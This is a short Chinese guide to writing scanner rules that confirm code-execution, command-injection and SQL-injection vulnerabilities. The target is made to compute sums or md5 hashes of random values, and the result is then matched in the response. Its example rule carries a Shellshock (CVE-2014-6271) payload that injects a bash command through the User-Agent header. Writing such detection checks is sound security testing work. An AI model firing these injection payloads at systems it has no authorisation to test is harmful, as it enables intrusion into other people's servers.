# 代码执行漏洞的检出

各种 rce 通常都可以直接使用整数相乘相加或者md5的方法，然后再查找返回结果，这样只有在代码真正被执行的时候才会得到预期的结果。

不要直接 echo 一些简单的字符串，容易造成误报。

1. 如果是测试命令执行，目前推荐使用 `expr num1 + num2`，主要因为星号在 shell 中可能有潜在的转义问题，执行其他的命令可能返回值格式并不方便匹配。
1. 如果是 php 等代码执行，可以使用
    1. print(数字 * 数字)
    1. print(md5(随机值))
    1. printf("随机值%%随机值") 实际输出会少一个百分号
1. sql 注入也可以使用 `union select md5(随机值)` 的原理
1. 考虑到有些32位系统整数上限可能低于`2^^31`和数字过短可能误报，目前要求乘法两个数字的取值范围必须在 `40000` 和 `44800` 之间，加法两个数字必须在 `800000000` 和 `1000000000` 之间。

一个例子：

```yaml
name: poc-yaml-bash-cve-2014-6271
set:
r1: randomInt(800000000, 1000000000)
r2: randomInt(800000000, 1000000000)
rules:
- method: GET
    headers:
    User-Agent: "() { :; }; echo; echo; /bin/bash -c 'expr {{r1}} + {{r2}}'"
    expression: response.body_string.contains(string(r1 + r2))
detail:
author: example(https://github.com/example)
links:
    - https://github.com/opsxcq/exploit-CVE-2014-6271
```